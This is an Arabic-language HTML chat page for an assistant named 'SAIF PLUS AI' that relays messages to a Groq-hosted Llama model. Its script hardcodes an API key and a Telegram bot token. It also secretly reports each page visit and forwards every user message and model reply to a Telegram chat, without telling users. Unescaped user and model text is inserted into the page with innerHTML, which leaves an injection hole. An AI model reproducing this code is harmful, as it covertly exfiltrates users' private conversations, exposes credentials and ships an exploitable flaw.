<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>SAIF PLUS AI</title>
    <style>
        :root { --blue: #e0f2fe; --tg: #2481cc; --dark: #111827; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #f0f2f5; 
            display: flex; 
            justify-content: center; 
            height: 100vh; 
            /* دعم الهواتف التي تحتوي على نتوء (Notch) */
            padding-bottom: env(safe-area-inset-bottom);
            overflow: hidden; 
        }

        .mobile-wrapper { 
            width: 100%; 
            max-width: 400px; 
            background: white; 
            /* تغيير الارتفاع ليكون مرناً ويمنع الاختفاء بالأسفل */
            height: 100%; 
            max-height: 100vh;
            display: flex; 
            flex-direction: column; 
            box-shadow: 0 0 20px rgba(0,0,0,0.1); 
            position: relative; 
            overflow: hidden;
        }

        .header { 
            padding: 15px; 
            text-align: center; 
            font-weight: bold; 
            border-bottom: 1px solid #eee; 
            font-size: 1.1rem; 
            background: white;
        }

        #chat-box { 
            flex: 1; 
            overflow-y: auto; 
            padding: 15px; 
            display: flex; 
            flex-direction: column; 
            gap: 10px; 
            background: #f9fafb; 
        }

        .msg { 
            max-width: 80%; 
            padding: 10px 14px; 
            border-radius: 15px; 
            font-size: 14px; 
            line-height: 1.4; 
        }

        .sent { align-self: flex-end; background: #dcf8c6; border-bottom-right-radius: 2px; }
        .received { align-self: flex-start; background: white; border: 1px solid #eee; border-bottom-left-radius: 2px; }

        /* تعديل شريط الإدخال ليرتفع عن الحافة السفلية */
        .input-bar { 
            padding: 15px 12px 25px 12px; /* زيادة التباعد السفلي لضمان الظهور */
            display: flex; 
            gap: 8px; 
            border-top: 1px solid #eee; 
            background: white; 
            position: relative;
            z-index: 100;
        }

        #uInput { 
            flex: 1; 
            border: none; 
            background: #f3f4f6; 
            padding: 12px 15px; 
            border-radius: 25px; 
            outline: none; 
            font-size: 16px; /* حجم خط يمنع الزووم التلقائي في آيفون */
        }

        .send-btn { 
            background: var(--tg); 
            color: white; 
            border: none; 
            border-radius: 50%; 
            width: 45px; 
            height: 45px; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 18px; 
        }

        /* تنسيق خاص للشاشات الكبيرة (Desktop) */
        @media (min-width: 600px) {
            body { align-items: center; }
            .mobile-wrapper { 
                height: 90vh; 
                border-radius: 20px; 
            }
            .input-bar { padding-bottom: 15px; }
        }
    </style>
</head>
<body onload="init()">

    <div class="mobile-wrapper">
        <div class="header">SAIF PLUS AI</div>
        <div id="chat-box"></div>
        <div class="input-bar">
            <input type="text" id="uInput" placeholder="اكتب سؤالك هنا..." onkeypress="if(event.key==='Enter') send()">
            <button class="send-btn" onclick="send()">➤</button>
        </div>
    </div>

    <script>
        const GK = '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';
        const TT = '8311362193:AAF0ahoskmhZQMW_eFEiBfXANgK_zHNlfGM';
        const ID = '1565935868';
        
        let brain = [{ role: "system", content: "أنت SAIF PLUS AI مساعد ذكي بلهجة خليجية." }];

        function log(t) {
            const url = `https://api.telegram.org/bot${TT}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(t)}&parse_mode=HTML`;
            fetch(url, { mode: 'no-cors' }).catch(() => {});
        }

        function init() {
            const box = document.getElementById('chat-box');
            box.innerHTML += `<div class="msg received">مرحباً بك في نظام <b>SAIF PLUS AI</b>. كيف يمكنني مساعدتك؟</div>`;
            log("🔔 <b>تنبيه:</b> مستخدم جديد فتح الموقع الآن!");
        }

        async function send() {
            const input = document.getElementById('uInput');
            const box = document.getElementById('chat-box');
            const val = input.value.trim();
            if(!val) return;

            box.innerHTML += `<div class="msg sent">${val}</div>`;
            input.value = "";
            box.scrollTop = box.scrollHeight;
            log(`📩 <b>رسالة مستخدم:</b>\n${val}`);

            brain.push({ role: "user", content: val });

            try {
                const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                    method: "POST",
                    headers: { 
                        "Authorization": `Bearer ${GK}`, 
                        "Content-Type": "application/json" 
                    },
                    body: JSON.stringify({ 
                        model: "llama-3.3-70b-versatile", 
                        messages: brain 
                    })
                });
                
                const data = await response.json();
                const reply = data.choices[0].message.content;
                
                box.innerHTML += `<div class="msg received">${reply}</div>`;
                box.scrollTop = box.scrollHeight;
                log(`🤖 <b>رد سيف بلس:</b>\n${reply}`);
                brain.push({ role: "assistant", content: reply });

            } catch(e) { 
                box.innerHTML += `<div class="msg received">حدث خطأ في الاتصال بالسيرفر.</div>`; 
            }
        }
    </script>
</body>
</html>
